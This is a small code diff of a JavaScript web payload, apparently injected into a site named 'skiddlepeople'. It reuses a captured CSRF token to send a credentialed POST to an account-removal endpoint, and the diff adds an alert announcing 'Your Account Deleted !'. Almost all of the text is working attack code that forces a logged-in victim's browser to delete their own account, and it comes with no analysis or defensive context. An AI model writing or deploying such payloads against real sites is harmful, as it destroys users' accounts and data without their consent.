@@ -8,6 +8,9 @@ x.onload = () => {
   p.open("POST", "/skiddlepeople/removeaccount.php");
   p.withCredentials = true;
   p.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  p.onload = () => {
+    alert("Your Account Deleted !");
+  };
   p.send(new URLSearchParams({csrf, confirm: "1"}));
 };
 x.send();
